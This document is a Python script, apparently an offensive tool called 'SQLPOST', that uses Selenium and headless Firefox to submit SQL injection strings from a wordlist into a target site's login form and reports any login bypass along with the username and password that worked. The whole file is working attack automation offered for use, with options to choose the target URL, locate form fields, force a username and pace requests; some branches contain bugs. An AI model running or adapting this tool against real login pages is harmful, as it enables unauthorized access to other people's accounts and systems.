#!/usr/bin/env python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import (
    WebDriverException,
    NoSuchElementException,
    TimeoutException,
    ElementClickInterceptedException,
    ElementNotInteractableException,
    StaleElementReferenceException,
    SessionNotCreatedException,
    InvalidArgumentException,
    JavascriptException,
)
import argparse
import time
import sys

W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m"   


class SQLInjector:

    def __init__(self):

        self.banner =B+'''
             |________|___________________|_   
             |        |      SQLPOST_     | |    UserName
             |'''+O+''' POST '''+R+'''  | | | | | | | | | | | |%%============='''+O+'''-'''+R+'''
             |________|_'''+B+'''__________________|_|    Password         
             |        |   '''+Y+P+'''@'''+Y+'''jacstory  '''+B+'''     | '''+W    
        print(self.banner+'\n')   

        self.setup_args()
        self.setup_browser()
        self.test_sql_injection()
    
    def setup_browser(self):
        options = Options()
        if not self.args.live:
            try: 
                options.add_argument('--headless')
                options.add_argument('--disable-gpu')
                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                service = Service('./geckodriver')
                self.driver = webdriver.Firefox(service=service, options=options)  
                self.driver.set_page_load_timeout(10)
            except Exception as e:
                print(R+"[+] Error      -------------|- "+W+Y+ f"An error of type {type(e).__name__}"+W)  
                exit() 
            except KeyboardInterrupt:
                  exit()       
        elif self.args.live : 
            try  :
                service = Service('./geckodriver')
                self.driver = webdriver.Firefox(service=service, options=options)  
                self.driver.set_page_load_timeout(10)
                self.driver.set_window_size(800, 600)  # Adjust size
                self.driver.set_window_position(self.driver.execute_script("return window.screen.availWidth;") - 800, 44)  
            except Exception as e:
                print(R+"[+] Error      -------------|- "+W+Y+ f"An error of type {type(e).__name__}"+W)  
                exit()   
            except KeyboardInterrupt:
                  exit()       
        try:        
            self.driver.get(self.args.url)
            self.page_len = len(self.driver.page_source)
            self.driver.set_page_load_timeout(10)
        except Exception as e:
            print(R+"[+] Error     -------------|- "+W+Y+ f"An error of type {type(e).__name__}"+W)  
            exit()
        except KeyboardInterrupt:
                  exit()        
    def test_sql_injection(self):
        if self.args.wordlist:
            list_command  = open(self.args.wordlist,'r')   
            list_command  = list_command.readlines()       
        else:
            list_command  = open("sql",'r')   
            list_command  = list_command.readlines() 
        self.Info_Print()
        if self.args.Continue:
            print(R+" "+"-"*150) 
            print("|  "+f"{'   username    ':<23}","| "+f"{'     password   ':<24}"+"| ",f"{'   Status  ':<11}","|",f"{'   login url ':<80}","|")
            print(" "+"-"*150+W)    
        for command in list_command :  
            if self.args.userforce:
                if "admin" in command:
                    command = str(command.replace('admin',self.args.userforce).replace('\n','').strip())
                else:
                    command  = str(command.strip())    
            else:
                command  = str(command.strip()) 
            try:
                self.driver.get(self.args.url)
                if self.args.user_form and self.args.pass_form:
                    user_field = self.driver.find_element(By.NAME, self.args.user_form)
                    pass_field = self.driver.find_element(By.NAME, self.args.pass_form)
                elif self.args.UCSS and self.args.PCSS :
                    user_field = self.driver.find_element(By.CSS_SELECTOR, self.args.UCSS)
                    pass_field = self.driver.find_element(By.CSS_SELECTOR, self.args.PCSS)
                elif self.args.UXpath and self.args.PXpath:
                   user_field = self.driver.find_element(By.XPATH, self.args.UXpath)
                   pass_field = self.driver.find_element(By.XPATH, self.args.PXpath)    
                elif self.args.IDUSER and self.args.IDPASS:
                    user_field = self.driver.find_element(By.ID, self.args.ID)
                    pass_field = self.driver.find_element(By.ID, self.args.ID)
                user_field.clear()
                pass_field.clear()
                if self.args.username:
                    if self.args.time:
                        time.sleep(int(self.args.time))
                    user_field.send_keys(self.args.username)
                    pass_field.send_keys(command) 
                elif self.args.password:
                    if self.args.time:
                        time.sleep(int(self.args.time))
                    user_field.send_keys(command)
                    pass_field.send_keys(self.args.password)   
                elif not self.args.username and not self.args.password: 
                    if self.args.time:
                        time.sleep(int(self.args.time))
                    user_field.send_keys(command)
                    pass_field.send_keys('password')      
                pass_field.send_keys(Keys.RETURN)
                time.sleep(.30)
                page_source = self.driver.page_source
                if self.args.error and self.args.error in str(page_source) or ("Error"or "error") in page_source :
                    print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
                    print(B+'[*]'+R+' Login Page  URL          : '+B, self.args.url+W )     
                    if self.args.error:
                        print(B+'[*]'+R+' Status                   : '+Y+self.args.error+W)
                    else:               
                        print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
                    for _ in range(4):
                        sys.stdout.write('\x1b[1A')
                        sys.stdout.write('\x1b[2K')  
                      
                else:
                    if self.args.Continue:
                        if self.args.username:
                            print(R+"|  "+Y+f"{self.args.username:<23}",R+"|"+P+f"{     command   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
                        elif self.args.password:
                            print(R+"|  "+Y+f"{command:<23}",R+"| "+P+f"{     self.args.password   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")  
                        elif not  self.args.username and not self.args.password:  
                            print(R+"|  "+Y+f"{command:<23}",R+"| "+P+f"{'   password    ':<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
                    elif not self.args.Continue  : 
                        print(O+'='*30+'\n')     
                        print(B+'[*] '+'Login URL  : '+R,  str(self.driver.current_url))
                        print(B+'[*] '+'SLQ Injaction Successful  Login \n')
                        print(O+'='*30+'\n\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n\n'+W)
                        if self.args.username:
                            print(B+'[+] '+R+'username : '+Y+f'{self.args.username}')
                            print(B+'[+] '+R+'Password : '+Y+f'{command}')
                        elif self.args.password:
                            print(B+'[+] '+R+'username : '+Y+f'{command}')
                            print(B+'[+] '+R+'Password : '+Y+ f'{self.args.password}')
                        elif not  self.args.username and not self.args.password:
                            print(B+'[+] '+R+'username : '+Y+f'{command}')
                            print(B+'[+] '+R+'Password : '+Y+ 'password') 

                        exit()
            except Exception :
                exit()
            except KeyboardInterrupt:
                  exit()  
        if self.args.Continue:
            print(O+'='*30+'\n')     
            print(B+'[*] '+'Login URL  : '+R,  str(self.driver.current_url))
            print(B+'[*] '+'SLQ Injaction Successful  Login \n')
            print(O+'='*30+'\n\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n\n'+W)
            if self.args.username:
                print(B+'[+] '+R+'username : '+Y+f'{self.args.username}')
                print(B+'[+] '+R+'Password : '+Y+f'{command}')
            elif self.args.password:
                print(B+'[+] '+R+'username : '+Y+f'{command}')
                print(B+'[+] '+R+'Password : '+Y+ f'{self.args.password}')
            elif not  self.args.username and not self.args.password:
                print(B+'[+] '+R+'username : '+Y+f'{command}')
                print(B+'[+] '+R+'Password : '+Y+ 'password') 
         
        print(B+'[!] '+R+'Web May Not Vulnerable To SQL Injaction '+W)
        print(B+'[*] '+R+'Saugger To Use anther list Command '+W) 
        self.driver.quit()
    def Info_Print(self):
        print(B+"[+] Target url         --------------|- " +  str(self.args.url))
        time.sleep(0.20)
        if self.args.wordlist:
            print("[+] wordlist           -------------|- " +  str(self.args.wordlist))
            time.sleep(0.20)
        else:
            print("[+] wordlist           --------------|- " +  "sql")  
            time.sleep(0.20) 
        if self.args.user_form  :
            print("[+] UserForm             --------------|- " +  self.args.user_form)
            time.sleep(0.20) 
        if self.args.pass_form  :
            print("[+] PassForm             --------------|- " +  self.args.pass_form )  
            time.sleep(0.20)   
        if self.args.UCSS:
              print("[+] CSS_SELECTOR USER  --------------|- " +  self.args.UCSS)
              time.sleep(0.20) 
        if self.args.PCSS:
              print("[+] CSS_SELECTOR PASS  --------------|- " +  self.args.PCSS )
              time.sleep(0.20) 
        if self.args.UXpath:
              print("[+] XPATH USER         --------------|- " +  self.args.UXpath)
              time.sleep(0.20) 
        if self.args.PXpath:
              print("[+] XPATH PASS         --------------|- " +  self.args.PXpath)
              time.sleep(0.20) 
        if self.args.IDUSER:
              print("[+] IDUSERFORM         --------------|- " +  self.args.IDUSER)
              time.sleep(0.20) 
        if self.args.IDPASS:
              print("[+] IDPASSFORM         --------------|- " +  self.args.IDPASS)  
              time.sleep(0.20)     
        if self.args.password:
              print("[+] Password           --------------|- " +  self.args.password)
              time.sleep(0.20) 
        if self.args.username:
              print("[+] UserName           --------------|- " +  self.args.username)
              time.sleep(0.20) 
        if self.args.userforce:
              print("[+] User wordlist      --------------|- " +  self.args.userforce)
              time.sleep(0.20) 
        if self.args.Continue : 
              print("[+] Continue           --------------|- " +  "TRUE")
              time.sleep(0.20) 
        if self.args.Length  :
              print("[+] Page Length        --------------|- " +  str(self.args.Length)+W+'\n')      
              time.sleep(0.20) 
        if self.args.error:
              print("[+] Error Message      --------------|- " +  self.args.error )
              time.sleep(0.20)  
        if self.args.time:
              print("[+] Sleep duration     --------------|- " +  self.args.time )
              time.sleep(0.20)                 
        print()
    def setup_args(self):
        parser = argparse.ArgumentParser(description="SQL Injection Tester with Selenium")
        parser.add_argument('-U', '--url'         , required=True,  help="Target URL of the login page")
        parser.add_argument('-uf', '--user_form'  , required=False, help="Name of the username input field")
        parser.add_argument('-pf', '--pass_form'  , required=False, help="Name of the password input field")
        parser.add_argument('-w', '--wordlist'    , required=False, help="File containing the list of SQL commands to test")
        parser.add_argument('-e', '--error'       , required=False, help="Error message to identify unsuccessful login attempts")
        parser.add_argument('-uc', '--UCSS'       , required=False, help="CSS selector for the username input field")
        parser.add_argument('-pc', '--PCSS'       , required=False, help="CSS selector for the password input field")
        parser.add_argument('-ux', '--UXpath'     , required=False, help="XPath for the username input field")
        parser.add_argument('-px', '--PXpath'     , required=False, help="XPath for the password input field")
        parser.add_argument('-ui', '--IDUSER'     , required=False, help="ID for the username input field")
        parser.add_argument('-pi', '--IDPASS'     , required=False, help="ID for the password input field")
        parser.add_argument('-p', '--password'    , required=False, help="Specific password to test")
        parser.add_argument('-u', '--username'    , required=False, help="Specific username to test")
        parser.add_argument('-f', '--userforce'   , required=False, help="Force a specific username into the wordlist")
        parser.add_argument('-C', '--Continue'    , required=False, action='store_true', help="Continue scanning through the entire wordlist")
        parser.add_argument('-L', '--Length'      , required=False, help="Set the expected page length to compare with the original page")
        parser.add_argument('-l', '--live'        , required=False, action='store_true', help="Show the web browser window (disable headless mode)")
        parser.add_argument('-T', '--time'        , required=False, help="Sleep duration between requests")

        self.args = parser.parse_args()   
        print(W+"")
        if len(sys.argv)!=1 :
            pass
        else:
            parser.print_help()        
            exit() 

if __name__ == '__main__':
    injector = SQLInjector()
